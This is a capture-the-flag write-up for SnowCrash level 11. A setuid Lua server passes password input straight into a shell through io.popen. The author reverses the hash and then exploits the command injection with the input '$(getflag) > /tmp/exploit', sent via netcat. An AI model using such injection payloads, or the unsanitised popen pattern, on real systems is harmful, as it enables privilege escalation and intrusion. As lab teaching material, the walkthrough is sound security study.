# SnowCrash

## Level11

```sh
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

```sh
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

```sh
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?
```
The server is already running, let's exploit it but first let's have fun and try to enter the else condition:
```
client:send("Gz you dumb*\n")
```


By using a reverse lookup table such as: https://sha1.gromweb.com/

We can see that "NotSoEasy" can produce the hash "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0"

The issue is that our program is running echo without the -n option, resulting in "NotSoEasy\n"
To bypass this we need to enter the password "-n NotSoEasy"

```sh
level11@SnowCrash:~$ nc localhost 5151
Password: -n NotSoEasy
Gz you dumb*
```

Now let's get the level12 password

```sh
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag) > /tmp/exploit
Erf nope..
level11@SnowCrash:~$ cat /tmp/exploit
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```